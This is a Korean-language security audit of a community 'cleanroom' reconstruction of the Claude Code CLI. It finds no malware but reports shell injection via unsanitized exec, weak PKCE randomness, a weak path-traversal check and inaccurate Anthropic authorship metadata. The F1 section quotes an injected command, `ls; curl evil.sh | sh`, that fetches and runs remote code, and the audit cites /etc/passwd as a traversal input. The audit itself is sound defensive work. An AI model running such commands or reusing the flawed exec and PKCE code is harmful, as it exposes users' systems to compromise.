# cleanroom 보안 audit — ref-cc-cleanroom

**대상**: ghuntley/claude-code-source-code-deobfuscation (commit ced7586, 2025-03)
**audit 일자**: 2026-04-25
**범위**: 55 files / 476KB / TypeScript ~11,249 LOC + JS preinstall + specs
**심각도 등급**: ✓ none | 🟡 low | 🟠 medium | 🔴 high | ⚫ critical

## 종합 결론

코드베이스 전반은 **악성코드/백도어/exfiltration 신호가 없는 학습용 cleanroom 재구성**이다. 모든
네트워크 호출은 `api.anthropic.com`, `auth.anthropic.com`, `telemetry.anthropic.com` 세
도메인 + `localhost:3000/callback`으로 한정되며, eval / Function 생성자 / atob /
base64 디코드 / 동적 require / 난독화 문자열 / 의심스러운 env-var 트리거가 모두 0건이다.
의존성도 `@anthropic-ai/claude-code`, `open`(sindresorhus), `uuid`, `@types/*` 5개로
전부 well-known 정상 패키지이며 typosquat 신호는 없다. `preinstall.js`는 Windows /
Node 18 미만만 거르는 단순 가드이고 postinstall hook은 0개다 (`hasInstallScript: true`는
upstream `@anthropic-ai/claude-code` 자체 속성이지 cleanroom 자체의 hook이 아님).

다만 **두 가지 코드 품질 결함**이 발견됐다. (1) `commands/register.ts`의 `run` /
`search` / `git` / `edit` 핸들러가 사용자 입력 문자열을 `child_process.exec()`에 그대로
shell interpolation으로 전달해 **shell injection에 노출**돼 있다 — 백도어가 아니라
"미완성 cleanroom의 미적용 가드". (2) `auth/oauth.ts`의 PKCE code challenge가 verifier를
SHA256 hash 없이 그대로 쓰고(파일 내 주석으로 본인이 인정), `generateRandomString`이
`Math.random()` 기반이라 **암호학적으로 약하다**. 둘 다 우리가 그대로 복붙하면 안 되는
부분이며, 원래 ghuntley도 "학습용"이라고 명시했다.

read-only 패턴 reference로는 **사용 가능**. 단, 코드 복붙·재배포 금지(매트릭스 §B04
F04)는 그대로 유효하며, 우리가 패턴을 차용할 때는 위 두 결함을 우리 구현에서 반드시
고쳐야 한다.

## audit 항목별 결과

| # | 항목 | 결과 | 발견 |
|---|---|:---:|---|
| 1 | 악성 네트워크 호출 | ✓ | anthropic.com 3개 + localhost callback만. Sentry는 stub(no-op). 의심 endpoint 0. |
| 2 | eval / Function() / dynamic require | ✓ | grep 결과 0건. `await import('child_process')` 등 정상 dynamic import만 존재. |
| 3 | unrestricted child_process / exec | 🟠 | `execution/index.ts`엔 `validateCommand` 가드 있음. 그러나 `register.ts`의 `run`/`search`/`git`/`edit`은 가드 우회. **shell injection 위험**. |
| 4 | fs writes outside workspace | 🟡 | `fileops/index.ts:83`에 `..` 제거 후 `path.resolve(workspacePath, ...)` 정규화 있음. 단 정규식이 약해 절대 경로(`/etc/passwd`)는 막지 못함. |
| 5 | 하드코딩된 credentials / API keys | ✓ | sk-/ghp_/AIza/40+ hex 패턴 0건. token은 전부 env(`CLAUDE_API_KEY`, `ANTHROPIC_API_KEY`) 또는 OAuth 흐름. |
| 6 | obfuscated strings / base64 blobs | ✓ | atob/Buffer.from base64/fromCharCode 0건. 모든 문자열이 평문. |
| 7 | prototype pollution | ✓ | `__proto__`, `prototype[`, `Object.assign(*.prototype` 0건. |
| 8 | 위험한 dependency / typosquat | ✓ | 5개 deps 모두 정식 패키지. `@anthropic-ai/claude-code 0.2.29`(공식), `open 10.1.0`(sindresorhus), `uuid 11.1.0`. integrity SHA512 모두 lock에 명시. |
| 9 | postinstall scripts | ✓ | cleanroom 자체엔 `preinstall.js` 1개만(Windows/Node 버전 가드, 안전). postinstall 0개. lock의 `hasInstallScript: true`는 upstream 패키지 속성. |
| 10 | 백도어 패턴 (env var trigger 등) | ✓ | env-var 분기는 `DEBUG`/`VERBOSE`/`LOG_LEVEL`/`CLAUDE_*`/`SHELL`/`EDITOR` 등 정상 용도만. 숨겨진 magic env 0. |
| 11 | license / 소유권 표시 | 🟡 | `claude-code/package.json`이 `"author": "Anthropic"`, `"license": "MIT"` 자칭. 실제 cleanroom인데 Anthropic 명의로 표기. README와 모순. |

## 발견 상세

### F1 (🟠 medium) — register.ts의 unsanitized exec

**위치**: `claude-code/src/commands/register.ts` 794, 866, 881, 1144, 1176, 1239 줄

```ts
// 794
const { stdout, stderr } = await execPromise(commandToRun);
// 881 — 사용자 term을 큰따옴표로만 감싸 grep에 통째로 전달
searchCommand = `grep -r --color=always -n "${term}" ${searchDir}`;
// 1176
const child = exec(editorCommand);  // editorCommand = `${editor} "${resolvedPath}"`
```

`execution/index.ts`가 정의한 `validateCommand()` (rm -rf, mkfs, fork bomb, sudo
패턴 차단)와 `allowedCommands` 화이트리스트는 **이 핸들러들에서 호출되지 않는다**.
즉 사용자가 `run "ls; curl evil.sh | sh"`를 입력하면 그대로 실행된다. 백도어 의도가
아니라 "두 모듈이 서로 미연결된 미완성 코드"로 보임.

**권고**: 우리가 `run` / `search` / `edit` 패턴을 차용한다면 (a) `execFile()` +
배열 인자로 shell 비활성, 또는 (b) execution/index.ts의 가드를 반드시 통과시켜야 함.

### F2 (🟠 medium) — OAuth PKCE/state 약한 난수 + SHA256 미적용

**위치**: `claude-code/src/auth/oauth.ts` 142-168

```ts
// 151 — 본인이 주석으로 "this is not secure!" 인정
const codeChallenge = codeVerifier;  // S256 hash 미적용
// 159
function generateRandomString(length: number): string {
  // ...
  result += chars.charAt(Math.floor(Math.random() * chars.length));
}
```

PKCE의 `code_challenge`가 verifier 평문, OAuth state도 `Math.random()` 기반.
실제 암호학적 보안 0. 또한 `startLocalServerForCallback`(203)은 진짜 HTTP 서버를
띄우지 않고 `setTimeout`으로 가짜 code/state를 생성해 `state !== receivedState`
검증을 항상 실패시킨다(즉 OAuth 흐름 자체가 미완성 stub).

**권고**: cleanroom의 OAuth는 **참고하지 말 것**. 우리가 OAuth가 필요하면
`crypto.randomBytes` + `crypto.createHash('sha256')` 표준 PKCE를 직접 구현.

### F3 (🟡 low) — Path traversal 정규식 약함

**위치**: `claude-code/src/fileops/index.ts:83`

```ts
const normalizedPath = path.normalize(relativePath).replace(/^(\.\.(\/|\\|$))+/, '');
return path.resolve(this.workspacePath, normalizedPath);
```

선두 `../`만 제거. 절대 경로(`/etc/passwd`) 입력 시 `path.resolve`가 두 번째 인자
절대값을 우선해 workspace 밖으로 나간다. `path.resolve` 결과가 `workspacePath`로
시작하는지 확인하는 sentinel check가 없다.

**권고**: 차용 시 `if (!resolved.startsWith(workspacePath + path.sep)) throw`
sentinel을 추가.

### F4 (🟡 low) — 잘못된 author/license 표기

**위치**: `claude-code/package.json`

```json
"author": "Anthropic",
"license": "MIT"
```

upstream `@anthropic-ai/claude-code`는 `"license": "SEE LICENSE IN README.md"`
(commercial proprietary)이고, 이 cleanroom은 Anthropic이 만든 게 아니다. ghuntley의
README는 "I am not anthropic"이라고 분명히 밝히지만, package.json 메타데이터는
일치하지 않는다. **악의적 사칭이라기보다 LLM 재생성 산출물의 메타데이터 미정리**로
판단(코드 자체가 "claim Anthropic authorship"하는 게 cleanroom 학습 패턴의 산물).

## license / 소유권 표시

- README.md: 명시적 disclaimer — "This is a cleanroom of the official Claude Code
  npm package. Claude Code is a product by Anthropic. I am not anthropic."
- `claude-code/LICENSE.md`, `specs/LICENSE.md`: Wikipedia cleanroom 문서 URL 한 줄만.
  실제 라이선스 텍스트 없음(일반적 OSS 라이선스 부재).
- `claude-code/package.json`: 위 F4 — `author: "Anthropic"`, `license: "MIT"` 부정확.
- Anthropic 권리 침해 신호: 코드는 spec 기반 재구성으로 보이며 upstream의
  난독화된 `cli.mjs`를 그대로 deobfuscation한 흔적은 식별 안 됨(난독화 잔재 없음,
  명명·주석 모두 신규 작성 스타일). 다만 **claude-code 이름·브랜딩·spec 구조를 그대로
  사용**하므로 Anthropic 상표/저작권 관점의 회색지대는 존재. ghuntley 본인은 이를
  "tradecraft 학습용 reference"로 포지셔닝.

## 권고

- **read-only 패턴 reference로 사용 OK** — 매트릭스 §B04 F04(코드 복붙·재배포 금지)
  유지. submodule로 적재한 현재 상태는 안전(설치 시 자동 실행 코드 0).
- **차용 시 우리가 직접 다시 작성해야 하는 부분**:
  - F1: shell command 디스패치는 `execFile` + 배열 인자 또는 자체 sanitizer로
    재구현 필수.
  - F2: OAuth/PKCE는 cleanroom 코드를 보지 말고 RFC 7636 + Node `crypto` 표준
    레퍼런스로 구현.
  - F3: workspace-relative path 헬퍼는 sentinel `startsWith` check 추가.
- **매트릭스 §D01/D02 채택 시**:
  - 패턴 카테고리(모듈 구조, 에러 분류, 설정 계층 구조 등) 차용은 가능 — 이쪽은
    아키텍처적 idea이지 코드가 아님.
  - 구체 코드 라인 차용은 금지. 차용 검토 대상 줄을 매트릭스 채택 ticket에
    명시하고 우리 코드로 다시 쓰기.
- **submodule 처리**: 현 상태(`projects/refs/ref-cc-cleanroom/`) 유지, `npm install`
  실행 금지(cleanroom 자체는 안전하나 의존성 `@anthropic-ai/claude-code 0.2.29`는
  `hasInstallScript: true`인 실제 upstream 패키지 — 학습 컨텍스트에서 굳이 설치할
  이유 없음).
- **개발자 가이드**: 이 audit 결과를 매트릭스 §B04 옆에 링크해두면, 향후 reviewer가
  "왜 이 repo는 read-only인가"를 한 번에 이해 가능.
